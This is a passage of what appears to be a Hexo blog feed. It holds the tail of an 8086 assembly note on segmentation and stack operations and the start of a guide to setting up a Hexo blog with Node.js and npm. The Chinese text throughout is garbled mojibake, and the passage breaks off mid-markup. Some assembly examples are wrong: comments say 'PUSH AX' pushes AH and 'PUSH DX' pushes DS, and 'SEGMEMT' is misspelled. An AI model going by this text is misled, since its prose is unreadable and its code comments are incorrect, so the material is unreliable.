¹æ®è‡ªå·±éœ€è¦æ¥è®¾å®šæ®µçš„ä¸ªæ•°ã€å„ä¸ªæ®µé•¿åº¦å’Œæ¯ä¸ªæ®µçš„ç”¨é€”ã€‚å¹¶ä¸”ä»£ç æˆ–æ•°æ®å¯ä»¥å­˜æ”¾åœ¨æ®µå†…ä»»æ„å•å…ƒä¸­ã€‚</p><p>2ã€æ¯ä¸ªæ®µçš„åŸºå€ï¼ˆæ®µåŸºå€ï¼‰å¿…é¡»æ˜¯ä¸€ä¸ªå°èŠ‚çš„é¦–å€ã€‚</p><p>æ®µåŸºå€ï¼šä¸€ä¸ªæ®µçš„èµ·å§‹åœ°å€ã€‚<br>åœ¨å­˜å‚¨å™¨ä¸­è§„å®šä» 0 åœ°å€å¼€å§‹ï¼Œæ¯ 16 ä¸ªå­—èŠ‚å•å…ƒç§°ä¸ºä¸€ä¸ªå°èŠ‚ã€‚å› æ­¤ï¼Œ1 MB å†…å­˜å°±å¯åˆ’åˆ†ä¸º 64 K ä¸ªå°èŠ‚ã€‚</p><p><img src="/2021/07/27/Code/Assembly/Assembly/344d7eeb13f1f2f1f7f331c3aa75fe0e.bmp" alt="capture_20210722175211235"></p><p>å¯ä»¥çœ‹å‡ºï¼Œæ¯ä¸ªå°èŠ‚çš„é¦–åœ°å€æœ€ä½ä½å¿…ä¸º 0ï¼ˆ16è¿›åˆ¶ï¼‰ã€‚å› æ­¤ï¼Œæ®µåŸºå€åªèƒ½æ˜¯ä¸Šè¿° 64 K ä¸ªå°èŠ‚é¦–å€ä¹‹ä¸€ã€‚</p><p>3ã€é€»è¾‘æ®µåœ¨ç‰©ç†å­˜å‚¨å™¨ä¸­å¯ä»¥æ˜¯é‚»æ¥çš„ã€é—´éš”çš„ã€éƒ¨åˆ†é‡å çš„å’Œå®Œå…¨é‡å çš„ç­‰4 ç§æƒ…å†µ</p><p>é€»è¾‘æ®µæ˜¯æŒ‡åœ¨æ±‡ç¼–è¯­è¨€æºç¨‹åºä¸­è®¾ç½®çš„æ®µ<br>å†…å­˜ä¸­çš„ä¸€ä¸ªç‰©ç†å­˜å‚¨å•å…ƒå¯ä»¥æ˜ è±¡åˆ°ä¸€ä¸ªæˆ–å¤šä¸ªé€»è¾‘æ®µä¸­</p><p><img src="/2021/07/27/Code/Assembly/Assembly/4b7981d007a6fb9b35ca2691edbdf513.bmp" alt="capture_20210722175628147"></p><p>4ã€åœ¨ä»»ä¸€æ—¶åˆ»ï¼Œä¸€ä¸ªç¨‹åºåªèƒ½è®¿é—® 4 ä¸ªå½“å‰æ®µä¸­çš„å†…å®¹ã€‚</p><p>4 ä¸ªæ®µåˆ†åˆ«æ˜¯ä»£ç æ®µã€æ•°æ®æ®µã€å †æ ˆæ®µå’Œé™„åŠ æ®µï¼Œç§°ä¸º<strong>å½“å‰æ®µ</strong>ã€‚4 ä¸ªæ®µå¯„å­˜å™¨ CS ã€DS ã€SS å’Œ ES åˆ†åˆ«ä¿å­˜äº†å®ƒä»¬<strong>æ®µåŸºå€</strong>çš„é«˜ 16 ä½åœ°å€ï¼Œç§°ä¸º<strong>æ®µåŸºå€¼</strong>ã€‚æ®µåŸºå€çš„æœ€ä½ 4 ä½ä¸º 0 ã€‚ï¼ˆå°èŠ‚é¦–å€çš„ä½4 ä½ä¸ºå…¨0ï¼‰ã€‚</p><h3 id="ä¸‰ã€é€»è¾‘åœ°å€ä¸ç‰©ç†åœ°å€åŠå¯¹åº”å…³ç³»"><a href="#ä¸‰ã€é€»è¾‘åœ°å€ä¸ç‰©ç†åœ°å€åŠå¯¹åº”å…³ç³»" class="headerlink" title="ä¸‰ã€é€»è¾‘åœ°å€ä¸ç‰©ç†åœ°å€åŠå¯¹åº”å…³ç³»"></a>ä¸‰ã€é€»è¾‘åœ°å€ä¸ç‰©ç†åœ°å€åŠå¯¹åº”å…³ç³»</h3><h4 id="1ã€ç‰©ç†åœ°å€"><a href="#1ã€ç‰©ç†åœ°å€" class="headerlink" title="1ã€ç‰©ç†åœ°å€"></a>1ã€ç‰©ç†åœ°å€</h4><p>åœ¨ 1MB çš„å­˜å‚¨ç©ºé—´ä¸­ï¼Œæ¯ä¸ªå­˜å‚¨å•å…ƒçš„ç‰©ç†åœ°å€æ˜¯å”¯ä¸€çš„ï¼Œå®ƒå°±æ˜¯è¯¥å­˜å‚¨å•å…ƒçš„ 20 ä½åœ°å€ã€‚<br>8086/8088 çš„ç‰©ç†åœ°å€èŒƒå›´ï¼š00000H ~ FFFFFH</p><h4 id="2ã€é€»è¾‘åœ°å€"><a href="#2ã€é€»è¾‘åœ°å€" class="headerlink" title="2ã€é€»è¾‘åœ°å€"></a>2ã€é€»è¾‘åœ°å€</h4><p>åœ¨ç¨‹åºè®¾è®¡ä¸­ï¼Œä¸ºäº†ä¾¿äºç¨‹åºçš„å¼€å‘å’Œå¯¹å­˜å‚¨å™¨è¿›è¡ŒåŠ¨æ€ç®¡ç†ï¼Œä½¿ç”¨äº†é€»è¾‘åœ°å€ã€‚</p><p>ä¸€ä¸ªé€»è¾‘åœ°å€åŒ…æ‹¬ä¸¤ä¸ªéƒ¨åˆ†ï¼šæ®µåŸºå€¼å’Œåç§»é‡</p><blockquote><p>æ®µåŸºå€¼ï¼šå­˜æ”¾åœ¨æŸä¸€ä¸ªæ®µå¯„å­˜å™¨ä¸­ï¼Œæ˜¯ä¸€ä¸ªé€»è¾‘æ®µçš„èµ·å§‹å•å…ƒåœ°å€ï¼ˆæ®µåŸºå€ï¼‰çš„é«˜ 16 ä½ã€‚<br>åç§»é‡ï¼šè¡¨ç¤ºæŸä¸ªå­˜å‚¨å•å…ƒä¸å®ƒæ‰€åœ¨æ®µçš„æ®µåŸºå€ä¹‹é—´çš„å­—èŠ‚è·ç¦»ã€‚</p></blockquote><p><img src="/2021/07/27/Code/Assembly/Assembly/f70445ef3c4ceddf8c922d24845c0066.bmp" alt="capture_20210722182103930"></p><p>é€»è¾‘åœ°å€çš„è¡¨ç¤ºæ–¹æ³•â€”â€”â€”-æ®µåŸºå€¼ï¼šåç§»é‡</p><p>ä¾‹å¦‚ï¼Œ3267Hï¼š00A0H è¡¨ç¤ºè¯¥é€»è¾‘å•å…ƒä½äºæ®µèµ·å§‹åœ°å€ä¸º 32670Hï¼Œæ®µå†…åç§»é‡ä¸º 00A0H ä¸ªå­—èŠ‚ã€‚</p><h4 id="3ã€é€»è¾‘åœ°å€è½¬åŒ–ä¸ºç‰©ç†åœ°å€"><a href="#3ã€é€»è¾‘åœ°å€è½¬åŒ–ä¸ºç‰©ç†åœ°å€" class="headerlink" title="3ã€é€»è¾‘åœ°å€è½¬åŒ–ä¸ºç‰©ç†åœ°å€"></a>3ã€é€»è¾‘åœ°å€è½¬åŒ–ä¸ºç‰©ç†åœ°å€</h4><p>å½“ CPU è¦è®¿é—®å­˜å‚¨å™¨æ—¶ï¼Œéœ€è¦ç”±æ€»çº¿æ¥å£å•å…ƒ BIU å°†é€»è¾‘åœ°å€è½¬æ¢æˆç‰©ç†åœ°å€ã€‚</p><p>è½¬æ¢æ–¹æ³•ï¼šå°†é€»è¾‘åœ°å€çš„æ®µåŸºå€¼å·¦ç§» 4 ä½ï¼Œå½¢æˆ 20 ä½çš„æ®µåŸºå€ï¼ˆä½ä½ä¸º0ï¼‰ç„¶åä¸ 16 ä½çš„åç§»é‡ç›¸åŠ ï¼Œç»“æœå³ä¸º20 ä½çš„ç‰©ç†åœ°å€ã€‚</p><p><img src="/2021/07/27/Code/Assembly/Assembly/0d6930528eeeacad42c99342f32255f2.bmp" alt="capture_20210722183513474" style="zoom:80%;"></p><h4 id="4ã€é€»è¾‘åœ°å€çš„æ¥æº"><a href="#4ã€é€»è¾‘åœ°å€çš„æ¥æº" class="headerlink" title="4ã€é€»è¾‘åœ°å€çš„æ¥æº"></a>4ã€é€»è¾‘åœ°å€çš„æ¥æº</h4><p>åœ¨ç¨‹åºçš„æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼ŒCPU æ ¹æ®ä¸åŒæ“ä½œç±»å‹è®¿é—®å­˜å‚¨å™¨ï¼Œå…¶é€»è¾‘åœ°å€ä¸­æ®µåŸºå€¼å’Œåç§»é‡çš„æ¥æºæ˜¯ä¸ä¸€æ ·çš„ã€‚</p><p>ä¸‹è¡¨æ˜¯å„ç§æ“ä½œç±»å‹æ‰€å¯¹åº”çš„é€»è¾‘åœ°å€çš„æ¥æºã€‚</p><p><img src="/2021/07/27/Code/Assembly/Assembly/39b4265ee082207d53806ea7a693c643.bmp" alt="capture_20210722184040743"></p><p>è¯´æ˜ï¼š</p><p>ï¼ˆ1ï¼‰å…è®¸æ›¿ä»£æ¥æºä¹Ÿå«åš<strong>æ®µè¶…è¶Š</strong>ï¼Œå®ƒè¡¨ç¤ºäº†æ®µåŸºå€¼é™¤ä½¿ç”¨éšå«çš„æ®µå¯„å­˜å™¨å¤–æ˜¯å¦å¯ä»¥æŒ‡å®šå…¶å®ƒæ®µå¯„å­˜å™¨æ¥æä¾›ã€‚</p><p>ï¼ˆ2ï¼‰æœ‰æ•ˆåœ°å€ EA ï¼Œå®ƒè¡¨ç¤ºæ ¹æ®æŒ‡ä»¤æ‰€é‡‡ç”¨çš„å¯»å€æ–¹å¼è®¡ç®—å‡ºæ¥çš„æ®µå†…åç§»é‡ã€‚</p><h2 id="2-4-å †æ ˆåŠå…¶æ“ä½œæ–¹æ³•"><a href="#2-4-å †æ ˆåŠå…¶æ“ä½œæ–¹æ³•" class="headerlink" title="2.4 å †æ ˆåŠå…¶æ“ä½œæ–¹æ³•"></a>2.4 å †æ ˆåŠå…¶æ“ä½œæ–¹æ³•</h2><p>å †æ ˆæ˜¯ä¸€ä¸ªç‰¹å®šçš„<strong>å­˜å‚¨åŒº</strong>ï¼Œè®¿é—®è¯¥å­˜å‚¨åŒºä¸€èˆ¬éœ€è¦<strong>æŒ‰ç…§ä¸“é—¨çš„è§„åˆ™è¿›è¡Œæ“ä½œ</strong>ã€‚</p><p><strong>å †æ ˆçš„ç”¨é€”ï¼šä¸»è¦ç”¨äºæš‚å­˜æ•°æ®ä»¥åŠåœ¨è¿‡ç¨‹è°ƒç”¨æˆ–å¤„ç†ä¸­æ–­æ—¶ä¿å­˜æ–­ç‚¹ä¿¡æ¯ã€‚</strong></p><h3 id="ä¸€ã€å †æ ˆçš„æ„é€ "><a href="#ä¸€ã€å †æ ˆçš„æ„é€ " class="headerlink" title="ä¸€ã€å †æ ˆçš„æ„é€ "></a>ä¸€ã€å †æ ˆçš„æ„é€ </h3><p>å †æ ˆä¸€èˆ¬åˆ†ä¸ºï¼šä¸“ç”¨å †æ ˆå­˜å‚¨å™¨å’Œè½¯ä»¶å †æ ˆ</p><blockquote><p>ä¸“ç”¨å †æ ˆå­˜å‚¨å™¨ï¼šæŒ‰å †æ ˆçš„å·¥ä½œæ–¹å¼ä¸“é—¨è®¾è®¡çš„å­˜å‚¨å™¨<br>è½¯ä»¶å †æ ˆï¼šç”±ç¨‹åºè®¾è®¡äººå‘˜ç”¨è½¯ä»¶åœ¨å†…å­˜ä¸­åˆ’å‡ºçš„ä¸€å—å­˜å‚¨åŒºä½œä¸ºå †æ ˆæ¥ä½¿ç”¨ã€‚8086/8088 é‡‡ç”¨è¿™ç§æ–¹å¼ã€‚</p></blockquote><p><img src="/2021/07/27/Code/Assembly/Assembly/35f77c7e900d49b664caa4f65d0878f2.bmp" alt="capture_20210722190221643"></p><p>åœ¨å †æ ˆä¸­å­˜å–æ•°æ®çš„è§„åˆ™æ˜¯ï¼šâ€œ å…ˆè¿›åå‡º FILO â€ï¼ˆ First-In Last-Out ï¼‰ã€‚å³æœ€å…ˆé€å…¥å †æ ˆçš„æ•°æ®è¦åˆ°æœ€åæ‰èƒ½å–å‡ºï¼Œè€Œæœ€åé€å…¥å †æ ˆçš„æ•°æ®ï¼Œæœ€å…ˆå–å‡ºã€‚</p><h3 id="äºŒã€8086-8088-å †æ ˆçš„ç»„ç»‡"><a href="#äºŒã€8086-8088-å †æ ˆçš„ç»„ç»‡" class="headerlink" title="äºŒã€8086/8088 å †æ ˆçš„ç»„ç»‡"></a>äºŒã€8086/8088 å †æ ˆçš„ç»„ç»‡</h3><p>åœ¨ 8086 / 8088 å¾®æœºä¸­å †æ ˆæ˜¯ç”±å †æ ˆæ®µå¯„å­˜å™¨ SS æŒ‡ç¤ºçš„ä¸€æ®µå­˜å‚¨åŒºã€‚</p><p><img src="/2021/07/27/Code/Assembly/Assembly/3dd22e0ea55a0725550c80e65bee8c06.bmp" alt="capture_20210722191158955"></p><ul><li><p>é¡¶ç”±å †æ ˆæŒ‡é’ˆ SP æŒ‡ç¤ºã€‚SP ä¸­å†…å®¹å§‹ç»ˆè¡¨ç¤ºå †æ ˆæ®µåŸºå€ä¸æ ˆé¡¶ä¹‹é—´çš„è·ç¦»ï¼ˆå­—èŠ‚æ•°ï¼‰ã€‚å½“ SP å†…å®¹ä¸ºæœ€å¤§ï¼ˆåˆå§‹ï¼‰å€¼æ—¶ï¼Œè¡¨ç¤ºå †æ ˆä¸ºç©ºã€‚è€Œå½“ï¼ˆ SP ï¼‰= 0 æ—¶ï¼Œè¡¨ç¤ºå †æ ˆå…¨æ»¡ã€‚</p></li><li><p>å½“ SP è¢«åˆå§‹åŒ–æ—¶ï¼ŒæŒ‡å‘æ ˆåº• +2 å•å…ƒï¼Œå…¶å€¼å°±æ˜¯å †æ ˆçš„é•¿åº¦ã€‚ç”±äº SP æ˜¯ 16 ä½å¯„å­˜å™¨ï¼Œå› æ­¤å †æ ˆé•¿åº¦ &lt;= 64K å­—èŠ‚ã€‚</p></li><li><p>æ•°æ®åœ¨å †æ ˆä¸­çš„å­˜æ”¾æ ¼å¼æ˜¯ï¼šä»¥<strong>å­—</strong>ä¸ºå•ä½å­˜æ”¾ï¼Œæ•°æ®çš„ä½ 8 ä½æ”¾åœ¨è¾ƒä½åœ°å€å•å…ƒï¼Œé«˜ 8 ä½æ”¾åœ¨è¾ƒé«˜åœ°å€å•å…ƒã€‚</p></li><li><p>å½“ç”¨æˆ·ç¨‹åºä¸­è¦æ±‚çš„å †æ ˆé•¿åº¦è¶…è¿‡ä¸€ä¸ªå †æ ˆæ®µçš„æœ€å¤§é•¿åº¦ 64KB æ—¶ï¼Œå¯ä»¥è®¾ç½®å‡ ä¸ªå †æ ˆæ®µã€‚</p></li><li><p>é€šè¿‡æ”¹å˜å †æ ˆæ®µå¯„å­˜å™¨ SS çš„å†…å®¹ï¼Œå³å¯æ”¹å˜åˆ°å¦ä¸€ä¸ªå †æ ˆæ®µï¼Œå½“æ”¹å˜äº†å †æ ˆæ®µå¯„å­˜å™¨ SS çš„å†…å®¹åï¼Œå¿…é¡»ç´§æ¥ç€èµ‹äºˆ SP æ–°å€¼ã€‚</p></li></ul><h3 id="ä¸‰ã€å †æ ˆæ“ä½œ"><a href="#ä¸‰ã€å †æ ˆæ“ä½œ" class="headerlink" title="ä¸‰ã€å †æ ˆæ“ä½œ"></a>ä¸‰ã€å †æ ˆæ“ä½œ</h3><h4 id="1ã€è®¾ç½®å †æ ˆ"><a href="#1ã€è®¾ç½®å †æ ˆ" class="headerlink" title="1ã€è®¾ç½®å †æ ˆ"></a>1ã€è®¾ç½®å †æ ˆ</h4><p>è®¾ç½®å †æ ˆä¸»è¦æ˜¯å¯¹å †æ ˆæ®µå¯„å­˜å™¨ SS å’Œå †æ ˆæŒ‡é’ˆ SP èµ‹å€¼ã€‚</p><p>ä¾‹å¦‚ï¼šSTACKI SEGMEMT PARA STACK<br>                         DB 100 DUP ï¼ˆ0ï¼‰<br>            STACKI ENDS</p><p>ç¬¬ä¸€è¡Œä¸­çš„PARA STACK å°±æ˜¯ç”¨æ¥è¯´æ˜æœ¬æ®µä¸ºå †æ ˆæ®µã€‚<br>å½“ç¨‹åºç»è¿‡æ±‡ç¼–ã€è¿æ¥å¹¶è£…å…¥å†…å­˜æ—¶ï¼Œç³»ç»Ÿå°†è‡ªåŠ¨ä¸ºå…¶åˆ†é…ä¸€ä¸ªå­˜å‚¨åŒºä½œä¸ºå †æ ˆæ®µï¼Œå°†è¿™ä¸ªæ®µçš„æ®µåŸºå€çš„é«˜ 16 ä½é€å…¥ SS ä¸­ï¼Œå°†ç¨‹åºæŒ‡å®šçš„å­—èŠ‚å•å…ƒæ•° 100 èµ‹å€¼ç»™ SP ã€‚</p><h4 id="2ã€è¿›æ ˆ-PUSH"><a href="#2ã€è¿›æ ˆ-PUSH" class="headerlink" title="2ã€è¿›æ ˆ PUSH"></a>2ã€è¿›æ ˆ PUSH</h4><p>è¿›æ ˆå°±æ˜¯æŠŠæ•°æ®å­˜å…¥å †æ ˆã€‚ç”±æŒ‡ä»¤ PUSH æˆ–è€…ç”±æœºå™¨è‡ªåŠ¨å®ç°ï¼Œå¯ä»¥å°†é€šç”¨å¯„å­˜å™¨ã€æ®µå¯„å­˜å™¨æˆ–å­—å­˜å‚¨å•å…ƒçš„å†…å®¹å‹å…¥å †æ ˆé¡¶éƒ¨ã€‚</p><p>ä¾‹å¦‚ï¼šPUSH AX ï¼›å°†å¯„å­˜å™¨ AH çš„å†…å®¹å‹å…¥å †æ ˆ<br>            PUSH DX ï¼›å°†æ®µå¯„å­˜å™¨ DS çš„å†…å®¹å‹å…¥å †æ ˆ<br>            PUSH DATA-WORD ï¼›å°†å­—å­˜å‚¨å•å…ƒ DATA-WORD å‹å…¥å †æ ˆ<br>            PUSHF ï¼›å°†æ ‡å¿—å¯„å­˜å™¨å†…å®¹å‹å…¥å †æ ˆ</p><p>è¿›æ ˆçš„æ‰§è¡Œè¿‡ç¨‹ï¼š<br>ï¼ˆ1ï¼‰é¦–å…ˆå°†å †æ ˆæŒ‡é’ˆ SP å‡ 2 ï¼ŒæŒ‡å‘ä¸€ä¸ªç©ºçš„å †æ ˆå­—å•å…ƒã€‚å³ï¼šSP = SP - 2<br>ï¼ˆ2ï¼‰å°†è¦å‚¨å­˜çš„å†…å®¹ï¼ˆå¯„å­˜å™¨æˆ–å­˜å‚¨å•å…ƒçš„å†…å®¹ï¼‰é€å…¥ SP æŒ‡å‘çš„å­—å•å…ƒä¸­ã€‚å³ï¼šï¼ˆSPï¼‰= æ•°æ®</p><h4 id="3ã€å‡ºæ ˆ-POP"><a href="#3ã€å‡ºæ ˆ-POP" class="headerlink" title="3ã€å‡ºæ ˆ POP"></a>3ã€å‡ºæ ˆ POP</h4><p>å‡ºæ ˆæ“ä½œç”± POP æŒ‡ä»¤æˆ–æœºå™¨è‡ªåŠ¨å®ç°ï¼Œå®ƒä»å †æ ˆé¡¶éƒ¨å¼¹å‡ºä¸€ä¸ªå­—åˆ°é€šç”¨å¯„å­˜å™¨ã€æ®µå¯„å­˜å™¨æˆ–å­—å­˜å‚¨å•å…ƒã€‚</p><p>ä¾‹å¦‚ï¼šPOP AX ï¼›å°†æ ˆé¡¶å­—å•å…ƒå†…å®¹å¼¹å‡ºåˆ° AX<br>            POP DS ï¼›å°†æ ˆé¡¶å­—å•å…ƒå†…å®¹å¼¹å‡ºåˆ° DS<br>            POP DATA-WORD ï¼›å°†æ ˆé¡¶å­—å•å…ƒå†…å®¹å¼¹å‡ºåˆ°å­—å­˜å‚¨å•å…ƒ DATA-WORD<br>            POPF ï¼›å°†æ ˆé¡¶å­—å•å…ƒå†…å®¹é€å›æ ‡å¿—å¯„å­˜å™¨ F ã€‚</p><p>å‡ºæ ˆçš„æ“ä½œè¿‡ç¨‹ï¼š<br>ï¼ˆ1ï¼‰å°† SP æŒ‡å‘çš„å­—å•å…ƒï¼ˆå³æ ˆé¡¶å­—å•å…ƒï¼‰å†…å®¹é€å¾€æŒ‡å®šçš„å¯„å­˜å™¨æˆ–å­˜å‚¨å™¨ã€‚<br>          å³ï¼šå¯„å­˜å™¨/å­˜å‚¨å™¨ = ï¼ˆSPï¼‰<br>ï¼ˆ2ï¼‰å †æ ˆæŒ‡é’ˆ SP åŠ  2 ï¼Œå³ï¼šSP = SP + 2</p><h1 id="ç¬¬ä¸‰ç« -å¯»å€æ–¹å¼ä¸æŒ‡ä»¤ç³»ç»Ÿ"><a href="#ç¬¬ä¸‰ç« -å¯»å€æ–¹å¼ä¸æŒ‡ä»¤ç³»ç»Ÿ" class="headerlink" title="ç¬¬ä¸‰ç«  å¯»å€æ–¹å¼ä¸æŒ‡ä»¤ç³»ç»Ÿ"></a>ç¬¬ä¸‰ç«  å¯»å€æ–¹å¼ä¸æŒ‡ä»¤ç³»ç»Ÿ</h1><h2 id="3-1-å¯»å€æ–¹å¼"><a href="#3-1-å¯»å€æ–¹å¼" class="headerlink" title="3.1 å¯»å€æ–¹å¼"></a>3.1 å¯»å€æ–¹å¼</h2><h2 id="3-2-æŒ‡ä»¤ç³»ç»Ÿ"><a href="#3-2-æŒ‡ä»¤ç³»ç»Ÿ" class="headerlink" title="3.2 æŒ‡ä»¤ç³»ç»Ÿ"></a>3.2 æŒ‡ä»¤ç³»ç»Ÿ</h2><h2 id="3-3-æŒ‡ä»¤ç¼–ç "><a href="#3-3-æŒ‡ä»¤ç¼–ç " class="headerlink" title="3.3 æŒ‡ä»¤ç¼–ç "></a>3.3 æŒ‡ä»¤ç¼–ç </h2>]]></content>
    
    
    <categories>
      
      <category>Assembly</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Code</tag>
      
      <tag>Assembly</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åŸºäºHexoæ¡†æ¶çš„ä¸ªäººåšå®¢æ­å»º</title>
    <link href="/2021/07/26/MessUp/%E5%9F%BA%E4%BA%8EHexo%E6%A1%86%E6%9E%B6%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    <url>/2021/07/26/MessUp/%E5%9F%BA%E4%BA%8EHexo%E6%A1%86%E6%9E%B6%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<p><strong>Hexo</strong> æ˜¯ä¸€ä¸ªå¿«é€Ÿã€ç®€æ´ä¸”é«˜æ•ˆçš„åšå®¢æ¡†æ¶ã€‚<strong>Hexo</strong> ä½¿ç”¨ <a href="http://daringfireball.net/projects/markdown/">Markdown</a>ï¼ˆæˆ–å…¶ä»–æ¸²æŸ“å¼•æ“ï¼‰è§£ææ–‡ç« ï¼Œåœ¨å‡ ç§’å†…ï¼Œå³å¯åˆ©ç”¨é“ä¸½çš„ä¸»é¢˜ç”Ÿæˆé™æ€ç½‘é¡µã€‚</p><p>è¿™é‡Œï¼Œåªæ˜¯ç®€å•åœ°ä»‹ç»äº†åŸºäº <strong>Hexo</strong> æ¡†æ¶çš„ä¸ªäººåšå®¢æ­å»ºï¼Œæ›´ä¸ºè¯¦ç»†ã€å…·ä½“çš„å‘½ä»¤å’Œæ“ä½œå¯ä»¥å» <strong>Hexo</strong> å®˜ç½‘æŸ¥çœ‹ã€‚</p><p><strong>Hexo</strong> å®˜ç½‘ï¼š<a href="https://hexo.io/zh-cn/">Hexo</a></p><h2 id="ä¸€ã€ä¾èµ–è½¯ä»¶å®‰è£…"><a href="#ä¸€ã€ä¾èµ–è½¯ä»¶å®‰è£…" class="headerlink" title="ä¸€ã€ä¾èµ–è½¯ä»¶å®‰è£…"></a>ä¸€ã€ä¾èµ–è½¯ä»¶å®‰è£…</h2><p><strong>Hexo</strong> çš„å®‰è£…å’Œè¿è¡Œä¾èµ– <strong>Node.js</strong> å’Œ <strong>Git</strong> ä¸¤ä¸ªè½¯ä»¶ï¼š</p><ul><li><p>å®‰è£…å®˜ç½‘ï¼š<a href="https://nodejs.org/en/">Node.js (nodejs.org)</a></p></li><li><p>å®‰è£…å®˜ç½‘ï¼š<a href="https://git-scm.com/">Git (git-scm.com)</a></p></li></ul><h3 id="1ã€Git-çš„å®‰è£…"><a href="#1ã€Git-çš„å®‰è£…" class="headerlink" title="1ã€Git çš„å®‰è£…"></a>1ã€Git çš„å®‰è£…</h3><p>1ï¼‰ä¸‹è½½ç›¸åº”ç‰ˆæœ¬ï¼Œè¿›è¡Œå®‰è£…ï¼Œæ‰€æœ‰è®¾ç½®å¯ä»¥é»˜è®¤ã€‚</p><p>2ï¼‰æ‰“å¼€ <strong>bash æˆ–è€… cmd</strong>ï¼ŒæŸ¥çœ‹ <strong>Git</strong> æ˜¯å¦å®‰è£…æˆåŠŸã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git --version<br>git version 2.30.1.windows.1<br></code></pre></td></tr></table></figure><p>å…³äº <strong>Git</strong> å’Œ <strong>Gitee</strong> çš„é…ç½®å’Œä½¿ç”¨å¯ä»¥çœ‹ã€ŠGit-Giteeåˆæ­¥é…ç½®åŠä½¿ç”¨ã€‹ã€‚</p><h3 id="2ã€Node-js-çš„å®‰è£…"><a href="#2ã€Node-js-çš„å®‰è£…" class="headerlink" title="2ã€Node.js çš„å®‰è£…"></a>2ã€Node.js çš„å®‰è£…</h3><p>1ï¼‰ä¸‹è½½ <strong>LTS</strong> ç‰ˆæœ¬ï¼Œè¿›è¡Œå®‰è£…ï¼Œæ‰€æœ‰è®¾ç½®å¯ä»¥é»˜è®¤ã€‚</p><p>2ï¼‰æ‰“å¼€ <strong>bash æˆ–è€… cmd</strong>ï¼ŒæŸ¥çœ‹ <strong>node</strong> å’Œ <strong>npm</strong> æ˜¯å¦å®‰è£…æˆåŠŸ</p><blockquote><p>å®‰è£… <strong>node</strong> çš„åŒæ—¶ä¹Ÿå®‰è£…äº† <strong>npm</strong> ï¼Œ<strong>npm</strong> æ˜¯ <strong>nodejs</strong>  çš„åŒ…ç®¡ç†å·¥å…·ã€‚</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ node -v<br>v14.17.3<br><br>$ npm -v<br>6.14.13<br></code></pre></td></tr></table></figure><blockquote><p>å¦‚æœ <strong>cmd</strong> ä¸­è¿è¡Œä»¥ä¸Šå‘½ä»¤æ˜¾ç¤º<strong>ä¸æ˜¯å†…éƒ¨æˆ–å¤–éƒ¨å‘½ä»¤ï¼Œä¹Ÿä¸æ˜¯å¯è¿è¡Œçš„ç¨‹åºæˆ–æ‰¹å¤„ç†æ–‡ä»¶</strong>ï¼Œé‚£ä¹ˆå¯èƒ½å®‰è£…æ—¶æ·»åŠ ç¯å¢ƒå˜é‡å¤±è´¥ï¼Œå¯ä»¥è‡ªè¡Œæ·»åŠ æˆ–è€…åœ¨<strong>å¼€å§‹</strong>çš„æœ€è¿‘æ·»åŠ ä¸­æ‰¾åˆ°å¹¶æ‰“å¼€ <strong>Node.js command prompt</strong> ï¼Œåœ¨å…¶ä¸­ä½¿ç”¨å‘½ä»¤è¡Œã€‚</p></blockquote><p>3ï¼‰ç”±äºå›½å¤–é•œåƒæºå¾ˆæ…¢ï¼Œç”¨ <strong>npm</strong> å›½å†…æ·˜å®çš„æºå…¨å±€å®‰è£… <strong>cnpm</strong> ï¼Œä»¥ä»£æ›¿ <strong>npm</strong> ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ npm install -g cnpm --registry=https://registry.npm.taobao.org<br>$ cnpm -v         <span class="hljs-comment">#æŸ¥çœ‹æ˜¯å¦å®‰è£…æˆåŠŸ</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œä¹Ÿå¯ä»¥ä¸å®‰è£… <strong>cnpm</strong> ï¼Œåªé…ç½® <strong>npm</strong> å›½å†…æ·˜å®çš„æºï¼Œä»¥åŠ å¿«ä¸‹è½½é€Ÿåº¦ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ npm config <span class="hljs-built_in">set</span> registry https://registry.npm.taobao.org<br>$ npm config get registry           <span class="hljs-comment">#æŸ¥çœ‹æ˜¯å¦é…ç½®æˆåŠŸ</span><br>https://registry.npm.taobao.org<br></code></pre></td></tr></table></figure><h2 id="äºŒã€å®‰è£…-Hexo-æ¡†æ¶"><a href="#äºŒã€å®‰è£…-Hexo-æ¡†æ¶" class="headerlink" title="äºŒã€å®‰è£… Hexo æ¡†æ¶"></a>äºŒã€å®‰è£… Hexo æ¡†æ¶</h2><p>1ã€ç”¨ <strong>cnpm</strong> å…¨å±€å®‰è£… <strong>Hexo</strong> çš„å‘½ä»¤è¡Œå·¥å…· <strong>hexo-cli</strong> ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ cnpm install -g hexo-cli<br></code></pre></td></tr></table></figure><p>2ã€ç”¨ <code>hexo -v</code> æŸ¥çœ‹æ˜¯å¦å®‰è£…æˆåŠŸã€‚çœ‹åˆ°ä»¥ä¸‹è¾“å‡ºï¼Œè¯´æ˜å®‰è£…æˆåŠŸã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 